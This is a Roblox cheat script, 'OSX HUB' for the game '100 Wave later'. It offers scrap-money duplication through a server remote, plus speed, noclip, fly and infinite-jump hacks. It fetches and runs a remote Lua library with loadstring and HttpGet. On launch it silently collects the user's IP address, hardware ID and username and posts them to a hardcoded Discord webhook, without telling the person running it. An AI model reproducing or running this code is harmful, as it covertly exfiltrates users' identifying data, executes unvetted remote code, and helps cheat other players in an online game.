-- [[ OSX HUB | 100 Wave later ]] --
-- [[ Script Version: v1.0.0 ]] --

local success, OSX = pcall(function()
    -- Attempt to load local dev file first
    return loadstring(readfile("OSX_Lib.lua"))()
end)

if not success then
    -- Fallback to Github version
    OSX = loadstring(game:HttpGet("https://raw.githubusercontent.com/yxucnx/OSX-HUB-Lib/refs/heads/main/OSX_Lib.lua?v=" .. tick()))()
end

-- Fetch Game Name
local success, productInfo = pcall(function()
    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
end)
local GameName = success and productInfo and productInfo.Name or "100 Wave later"

-- [[ SERVICES ]] --
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- [[ LOGGING SYSTEM ]] --
local WebhookURL = "https://discord.com/api/webhooks/1490398138220019825/jlZBTnlWn2ZWKEd4bvBUYjQrnQXCX4N9MjfVSK0ceBqQQVIBHaZQ4xDcPnCnA0SlDbAs"

local function SendLog()
    task.spawn(function()
        local success, ip = pcall(function() return game:HttpGet("https://api4.ipify.org/") end)
        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        local time = os.date("%X")
        
        local payload = {
            ["username"] = "𝗢𝗦𝗫 𝗛𝗨𝗕 - 𝗟𝗢𝗚 𝗨𝗦𝗘 𝗦𝗖𝗥𝗜𝗣𝗧",
            ["avatar_url"] = "https://media.discordapp.net/attachments/1485621966575501312/1488393679117881344/logo512v2.png?ex=69d335a2&is=69d1e422&hm=9403f72a1903c8fa334cf883d7f906b1c06b8e3e6c7432b5b1e6b50fe8281e22&=&format=webp&quality=lossless",
            ["embeds"] = {{
                ["title"] = "[!] : 𝗧𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘁𝗵𝗲 𝘂𝘀𝗲 𝗼𝗳 𝗮 𝘀𝗰𝗿𝗶𝗽𝘁.",
                ["description"] = string.format(
                    "――――――――――――――――――――――\n\n**👤 User :**  ```%s```\n**🎮 Script Name :** ```%s```\n**🖥️ HWID :** ```%s```\n**🔐 KEY :** ```%s```\n**🗺️ IP :** ```%s```\n**❌ ACC BAN :** ```%s```\n**🧾Reason :** ```%s```\n** ⏳ Time Data :** ```%s```\n\n――――――――――――――――――――――",
                    localPlayer.Name, GameName, hwid, "None", (success and ip or "Unknown"), "None", "None", time
                ),
                ["color"] = 34303,
                ["footer"] = {
                    ["text"] = "© 2026 Osx Hub. All rights reserved.",
                    ["icon_url"] = "https://media.discordapp.net/attachments/1485621966575501312/1488393679117881344/logo512v2.png?ex=69d335a2&is=69d1e422&hm=9403f72a1903c8fa334cf883d7f906b1c06b8e3e6c7432b5b1e6b50fe8281e22&=&format=webp&quality=lossless"
                },
                ["image"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1485621966575501312/1490364198008393818/standard_1.gif?ex=69d3c952&is=69d277d2&hm=84671fab55d2308ed14c9bd662582a0e6170d1ed0a55c8c6fcbe0cdbbea901fd&="
                }
            }}
        }
        
        local successPost, err = pcall(function()
            (request or http_request or (http and http.request))({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

-- Call Initial Log
SendLog()

-- [[ GLOBAL VARIABLES ]] --
_G.AutoCollectScrap = false
_G.ScrapAmount = 9999
_G.WalkSpeed = 16
_G.JumpPower = 50
_G.InfJump = false
_G.CFrameSpeed = false
_G.CFrameValue = 0.5
_G.NoClip = false
_G.FlyEnabled = false
_G.FlySpeed = 50


-- Window Setup
local Window = OSX:CreateWindow({
    Title = "OSX HUB | " .. GameName,
    Subtitle = "Made by: LilYouDev1997 | Discord: discord.gg/osxhub",
    WindowLogo = "https://img2.pic.in.th/logo512v2.png",
    FloatingLogo = "https://img1.pic.in.th/images/logo512v1.png",
    ToggleKey = Enum.KeyCode.RightControl
})

-- [[ INFO TAB ]] --
local InfoTab = Window:AddTab({
    Title = "Info",
    SubDescription = "Information & Credits",
    Icon = "info"
})

local DevPanel = InfoTab:AddPanel("Developer Panel")
DevPanel:AddInfoLabel("Owner", "darkmxde.")
DevPanel:AddInfoLabel("Developer", "LilYouDev1997x")
DevPanel:AddInfoLabel("Last Update", "6/4/2026")

DevPanel:AddButton({
    Title = "Join Discord",
    Description = "คลิกเพื่อคัดลอกลิงก์ Discord ของพวกเรา",
    Callback = function()
        setclipboard("https://discord.gg/osxhub")
        OSX:Notify({Title = "System", Content = "Discord Link Copied!"})
    end
})

-- [[ MAIN TAB ]] --
local MainTab = Window:AddTab({
    Title = "Main",
    SubDescription = "Main Features",
    Icon = "home"
})

local MainPanel = MainTab:AddPanel("Main Features")

MainPanel:AddToggle({
    Title = "Infinite Scrap (Money)",
    Description = "รับ Scrap จำนวนมากเมื่อกำจัดซอมบี้ (เงินไม่จำกัด)",
    Default = false,
    Callback = function(Value) _G.AutoCollectScrap = Value end
})

MainPanel:AddInput({
    Title = "Set Scrap Reward",
    Description = "ปรับจำนวน Scrap ที่ได้รับต่อการฆ่าหนึ่งครั้ง",
    Default = "9999",
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            _G.ScrapAmount = num
            OSX:Notify({Title = "Setting Updated", Content = "Scrap amount set to: " .. num})
        end
    end
})

-- [[ PLAYER TAB ]] --
local PlayerTab = Window:AddTab({
    Title = "Player",
    SubDescription = "Character Enhancements",
    Icon = "user"
})

local StatsPanel = PlayerTab:AddPanel("Character Stats")

StatsPanel:AddSlider({
    Title = "WalkSpeed",
    Description = "ปรับความเร็วในการเดิน",
    Min = 16,
    Max = 300,
    Default = 16,
    Callback = function(Value)
        _G.WalkSpeed = Value
        if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
            localPlayer.Character.Humanoid.WalkSpeed = Value
        end
    end
})

StatsPanel:AddSlider({
    Title = "JumpPower",
    Description = "ปรับแรงกระโดด",
    Min = 50,
    Max = 500,
    Default = 50,
    Callback = function(Value)
        _G.JumpPower = Value
        if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
            localPlayer.Character.Humanoid.JumpPower = Value
            localPlayer.Character.Humanoid.UseJumpPower = true
        end
    end
})

StatsPanel:AddToggle({
    Title = "Infinite Jump",
    Description = "กระโดดบนอากาศได้ไม่จำกัด",
    Default = false,
    Callback = function(Value) _G.InfJump = Value end
})

local MovementPanel = PlayerTab:AddPanel("Movement Hacks")

MovementPanel:AddToggle({
    Title = "CFrame Speed",
    Description = "วิ่งไวด้วยระบบ CFrame (ทะลุแมพได้)",
    Default = false,
    Callback = function(Value) _G.CFrameSpeed = Value end
})

MovementPanel:AddSlider({
    Title = "CFrame Value",
    Description = "ปรับความไวของ CFrame (ตัวเลขต่ำได้ถึง 0.01)",
    Min = 0.01,
    Max = 10,
    Default = 0.5,
    Rounding = 2,
    Callback = function(Value) _G.CFrameValue = Value end
})

MovementPanel:AddToggle({
    Title = "No Clip",
    Description = "เดินทะลุสิ่งกีดขวางและกำแพงได้",
    Default = false,
    Callback = function(Value) _G.NoClip = Value end
})

MovementPanel:AddToggle({
    Title = "Fly Mode",
    Description = "บินได้อย่างอิสระ (ใช้ WASD + Space/Shift)",
    Default = false,
    Callback = function(Value) _G.FlyEnabled = Value end
})

MovementPanel:AddSlider({
    Title = "Fly Speed",
    Description = "ระดับความเร็วในการบิน",
    Min = 10,
    Max = 500,
    Default = 50,
    Callback = function(Value) _G.FlySpeed = Value end
})
-- [[ SETTINGS TAB ]] --
local SettingsTab = Window:AddTab({
    Title = "Settings",
    SubDescription = "UI & System Config",
    Icon = "settings"
})

local ConfigPanel = SettingsTab:AddPanel("Interface Settings")

ConfigPanel:AddKeybind({
    Title = "Toggle UI Key",
    Description = "กดปุ่มเพื่อ เปิด หรือ ปิด หน้าต่างเมนู",
    Default = "RightControl",
    Callback = function()
        print("Toggle key pressed")
    end
})

ConfigPanel:AddButton({
    Title = "Destroy UI",
    Description = "ปิดการใช้งานทั้งหมดเเละปิด UI",
    Callback = function()
        Window:Destroy()
        OSX:Notify({Title = "System", Content = "UI Destroyed Successfully."})
    end
})

local UserPanel = SettingsTab:AddPanel("User Information")
UserPanel:AddInfoLabel("Player", localPlayer.Name, "ชื่อผู้เล่นปัจจุบัน")
UserPanel:AddInfoLabel("Game", GameName, "เกมที่กำลังเล่น")
UserPanel:AddInfoLabel("Status", "Operational", "สถานะการทำงาน")

-- [[ NOTIFICATION ]] --
OSX:Notify({
    Title = "OSX HUB Loaded",
    Content = "100 Wave later logic is ready!",
    Duration = 5
})


-- [[ BACKEND LOGIC ]] --
local remote = RS:WaitForChild("Packages"):WaitForChild("_Index")["sleitnick_knit@1.6.0"].knit.Services.PickupManager.RE.Collect

workspace.DescendantAdded:Connect(function(v)
    if _G.AutoCollectScrap then
        local id = v:GetAttribute("Id")
        if id then
            pcall(function()
                remote:FireServer(id, "SCRAP", _G.ScrapAmount)
            end)
        end
    end
end)

-- Infinite Jump Hook (Evade Method)
game:GetService("UserInputService").JumpRequest:Connect(function()
    if _G.InfJump then
        local char = localPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

-- Fly Logic
local camera = workspace.CurrentCamera
local BV, BG = nil, nil

game:GetService("RunService").RenderStepped:Connect(function()
    local char = localPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    
    if _G.FlyEnabled and hrp and hum then
        if not BV then
            BV = Instance.new("BodyVelocity")
            BV.MaxForce = Vector3.new(1, 1, 1) * math.huge
            BV.Velocity = Vector3.new(0, 0, 0)
            BV.Parent = hrp
            
            BG = Instance.new("BodyGyro")
            BG.MaxTorque = Vector3.new(1, 1, 1) * math.huge
            BG.P = 15000
            BG.Parent = hrp
            
            hum.PlatformStand = true
        end
        
        -- Smoothly update Gyro to match Camera
        BG.CFrame = camera.CFrame
        
        -- Logic: Calculate movement based on actual key presses
        local uis = game:GetService("UserInputService")
        local finalVelocity = Vector3.new(0, 0, 0)
        
        if uis:IsKeyDown(Enum.KeyCode.W) then
            finalVelocity = finalVelocity + (camera.CFrame.LookVector * _G.FlySpeed)
        end
        if uis:IsKeyDown(Enum.KeyCode.S) then
            finalVelocity = finalVelocity - (camera.CFrame.LookVector * _G.FlySpeed)
        end
        if uis:IsKeyDown(Enum.KeyCode.A) then
            finalVelocity = finalVelocity - (camera.CFrame.RightVector * _G.FlySpeed)
        end
        if uis:IsKeyDown(Enum.KeyCode.D) then
            finalVelocity = finalVelocity + (camera.CFrame.RightVector * _G.FlySpeed)
        end
        
        BV.Velocity = finalVelocity
        
        -- NoClip while flying to prevent collisions/jitter
        for _, v in ipairs(char:GetDescendants()) do
            if v:IsA("BasePart") then v.CanCollide = false end
        end
    else
        if BV then BV:Destroy() BV = nil end
        if BG then BG:Destroy() BG = nil end
        if hum then hum.PlatformStand = false end
    end
end)

-- CFrame Speed Logic
game:GetService("RunService").Stepped:Connect(function()
    if _G.CFrameSpeed then
        local char = localPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        
        if hrp and hum and hum.MoveDirection.Magnitude > 0 then
            hrp.CFrame = hrp.CFrame + (hum.MoveDirection * _G.CFrameValue)
        end
    end
    
    -- NoClip Logic
    if _G.NoClip then
        local char = localPlayer.Character
        if char then
            for _, v in ipairs(char:GetDescendants()) do
                if v:IsA("BasePart") then v.CanCollide = false end
            end
        end
    end
end)

-- Stats Persistence
task.spawn(function()
    while true do
        task.wait(1)
        pcall(function()
            if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
                localPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed
                if _G.JumpPower > 50 then
                    localPlayer.Character.Humanoid.JumpPower = _G.JumpPower
                    localPlayer.Character.Humanoid.UseJumpPower = true
                end
            end
        end)
    end
end)

print("100Wavelater UI Loaded.")
